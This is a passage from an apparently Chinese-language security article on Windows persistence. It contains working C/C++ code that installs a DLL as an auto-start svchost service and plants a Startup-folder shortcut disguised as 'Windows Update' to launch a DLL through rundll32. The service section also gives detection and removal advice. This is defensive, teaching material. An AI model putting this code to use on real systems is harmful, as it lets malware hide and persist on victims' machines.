        }
        rc = RegQueryValueEx(hkRoot, _TEXT("netsvcs"), 0, &type, buff, &size);
        RegCloseKey(hkRoot);
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
        {
            goto ERROR_EXIT;
        }
        //install service
        hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (hscm == NULL)
        {
            goto ERROR_EXIT;
        }
        if(!search_svchost_service_name(service_name_buffer, buffer_size))
        {
            goto ERROR_EXIT;
        }
        schService = CreateService(
            hscm,                      // SCManager database
            service_name_buffer,                    // name of service
            service_name_buffer,           // service name to display
            SERVICE_ALL_ACCESS,        // desired access
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,      // start type
            SERVICE_ERROR_NORMAL,      // error control type
            binary_path,        // service's binary
            NULL,                      // no load ordering group
            NULL,                      // no tag identifier
            NULL,                      // no dependencies
            NULL,                      // LocalSystem account
            NULL);                     // no password
        dwStartType = SERVICE_WIN32_OWN_PROCESS;
        if (schService == NULL)
        {
            goto ERROR_EXIT;
        }
        CloseServiceHandle(schService);
        CloseServiceHandle(hscm);
        //config service
        hkRoot = HKEY_LOCAL_MACHINE;
        lstrcpy((TCHAR*)buff, _TEXT("SYSTEM\\CurrentControlSet\\Services\\"));
        lstrcat((TCHAR*)buff, service_name_buffer);
        rc = RegOpenKeyEx(hkRoot, (TCHAR*)buff, 0, KEY_ALL_ACCESS, &hkRoot);
        if(ERROR_SUCCESS != rc)
        {
            goto ERROR_EXIT;
        }
        rc = RegCreateKey(hkRoot, _TEXT("Parameters"), &hkParam);
        if(ERROR_SUCCESS != rc)
        {
            goto ERROR_EXIT;
        }
        rc = RegSetValueEx(hkParam, _TEXT("ServiceDll"), 0, REG_EXPAND_SZ, (PBYTE)full_dll_path, lstrlen(full_dll_path)  * sizeof(TCHAR) + sizeof(TCHAR));
        if(ERROR_SUCCESS != rc)
        {
            goto ERROR_EXIT;
        }
        bRet = TRUE;
    ERROR_EXIT:
        if(hkParam != NULL)
        {
            RegCloseKey(hkParam);
            hkParam = NULL;
        }
        if(schService != NULL)
        {
            CloseServiceHandle(schService);
            schService = NULL;
        }
        if(hscm != NULL)
        {
            CloseServiceHandle(hscm);
            hscm = NULL;
        }
        return bRet;
    }
    void start_service(LPCTSTR lpService)
    {
        SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
        if ( NULL != hSCManager )
        {
            SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
            if ( NULL != hService )
            {
                StartService(hService, 0, NULL);
                CloseServiceHandle( hService );
            }
            CloseServiceHandle( hSCManager );
        }
    }
    BOOL add_to_service()
    {
        //
        BOOL bRet = FALSE;
        DWORD service_name_size;
        TCHAR service_name[MAXBYTE * 2];
        service_name_size = sizeof(service_name) / sizeof(TCHAR);
        if(install_service(_TEXT("C:\\service.dll"),service_name, &service_name_size))
        {
            start_service(service_name);
            _tprintf(_TEXT("install service successful!!!"));
            bRet= TRUE;
        }
        else
        {
            _tprintf(_TEXT("can not install service!!!"));
        }
        return bRet;
    }
而服务DLL也需要满足一定的格式，该服务必须导出ServiceMain()函数并调用RegisterServiceCtrlHandlerEx()函数注册Service
Handler，具体的服务DLL的代码如下如下
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    SERVICE_STATUS_HANDLE g_service_status_handle = NULL;
    SERVICE_STATUS g_service_status = 
    {
        SERVICE_WIN32_SHARE_PROCESS,
        SERVICE_START_PENDING,
        SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE
    };
    DWORD WINAPI ServiceHandler(DWORD dwControl,DWORD dwEventType,LPVOID lpEventData,LPVOID lpContext)
    {
        switch (dwControl)
        {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            g_service_status.dwCurrentState = SERVICE_STOPPED;
            break;
        case SERVICE_CONTROL_PAUSE:
            g_service_status.dwCurrentState = SERVICE_PAUSED;
            break;
        case SERVICE_CONTROL_CONTINUE:
            g_service_status.dwCurrentState = SERVICE_RUNNING;
            break;
        case SERVICE_CONTROL_INTERROGATE:
            break;
        default:
            break;
        };
        SetServiceStatus(g_service_status_handle, &g_service_status);
        return NO_ERROR;
    }
    extern "C" __declspec(dllexport) VOID WINAPI ServiceMain(DWORD dwArgc,LPCTSTR* lpszArgv)
    {
        g_service_status_handle = RegisterServiceCtrlHandlerEx(_TEXT("Svchost Service"), ServiceHandler, NULL);
        if (!g_service_status_handle)
        {
            return;
        }
        g_service_status.dwCurrentState = SERVICE_RUNNING;
        SetServiceStatus(g_service_status_handle, &g_service_status);
        while(TRUE)
        {
            Sleep(1000);
            OutputDebugString(_TEXT("Hello Topsec In Svchost"));
        }
        return;
    };
## **运行效果图**
运行样本文件后，服务被创建起来，在后台稳定运行中。
![
](https://images.seebug.org/content/images/2019/08/1f689821-bea1-4c76-80b5-850bc0b4feb6.png-w331s)
## **检查及清除方法**
1、 监控新服务的创建，检查新服务的关键信息，如ImagePath，对文件进行验证。禁止不明来源服务的安装行为
2、 使用Sysinternals
Autoruns工具检查已有的服务，并验证服务模块的合法性。如验证是否有文件签名、签名是否正常。可以使用AutoRuns工具删除不安全的服务
![
](https://images.seebug.org/content/images/2019/08/dd153d57-f8d7-4855-912f-fb96a745cbfa.png-w331s)
# **启动项**
## **原理及代码介绍**
启动项，就是开机的时候系统会在前台或者后台运行的程序。设置启动项的方式分为两种：1. Startup文件夹
文件快捷方式是一种用户界面中的句柄，它允许用户找到或使用位于另一个目录或文件夹的一个文件或资源，快捷方式还可能额外指定命令行参数，从而在运行它时将所定参数传递到目标程序。
Startup文件夹是Windows操作系统中的功能，它使用户能够在Windows启动时自动运行指定的程序集。在不同版本的Windows中，启动文件夹的位置可能略有不同。任何需要在系统启动时自动运行的程序都必须存储为此文件夹中的快捷方式。
攻击者可以通过在Startup目录建立快捷方式以执行其需要持久化的程序。他们可以创建一个新的快捷方式作为间接手段，可以使用伪装看起来像一个合法的程序。攻击者还可以编辑目标路径或完全替换现有快捷方式，以便执行其工具而不是预期的合法程序。
如下的代码演示了在Startup目录建立快捷方式来实现后门持久化：
    BOOL add_to_lnkfile()
    {
        BOOL ret = FALSE;
        HRESULT hcode;
        TCHAR startup_path[MAX_PATH];
        TCHAR save_path[MAX_PATH*2];
        TCHAR command[MAXBYTE * 2];
        IShellLink* shelllnk = NULL;
        IPersistFile* pstfile = NULL;
        hcode = CoInitialize(NULL);
        if (hcode != S_OK)
        {
            goto Error_Exit;
        }
        hcode = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&shelllnk);
        if (hcode != S_OK)
        {
            goto Error_Exit;
        }
        hcode = shelllnk->QueryInterface(IID_IPersistFile,(void**)&pstfile);
        if (hcode != S_OK)
        {
            goto Error_Exit;
        }
        //设置快捷方式命令
        wsprintf(command, _TEXT("C:\\windows\\system32\\rundll32.exe"));
        hcode = shelllnk->SetPath(command);
        if (hcode != S_OK)
        {
            MessageBox(NULL, command, command,MB_OK);
            goto Error_Exit;
        }
        wsprintf(command, _TEXT(" %s %s"), _TEXT("c:\\topsec.dll"), _TEXT("RunProc"));
        hcode = shelllnk->SetArguments(command);
        if (hcode != S_OK)
        {
            goto Error_Exit;
        }
        wsprintf(command, _TEXT("%s"), _TEXT("This is For Windows Update!!!"));
        hcode = shelllnk->SetDescription(command);
        if (hcode != S_OK)
        {
            goto Error_Exit;
        }
        hcode = shelllnk->SetWorkingDirectory(_TEXT("c:\\"));
        if (hcode != S_OK)
        {
            goto Error_Exit;
        }
        //获取启动目录
        if(SHGetSpecialFolderPath(NULL, startup_path, CSIDL_STARTUP, FALSE) == FALSE)
        {
            goto Error_Exit;
        }
        wsprintf(save_path, _TEXT("%s\\%s"), startup_path, _TEXT("Windows Update.Lnk"));
        hcode = pstfile->Save(save_path, TRUE);
        if (hcode != S_OK)
        {
            goto Error_Exit;
        }
        ret = TRUE;
    Error_Exit:
        if (shelllnk != NULL)
        {
            shelllnk->Release();
            shelllnk = NULL;
        }
        if (pstfile != NULL)
        {
            pstfile->Release();
            pstfile = NULL;
        }
        CoUninitialize();
        return ret;
    }
从资源中释放文件的代码如下：
    BOOL ReleaseFile(LPTSTR resource_type, LPTSTR resource_name, LPCTSTR save_path)
    {
        BOOL ret = FALSE;
        DWORD cb = NULL;
        HRSRC h_resource = NULL;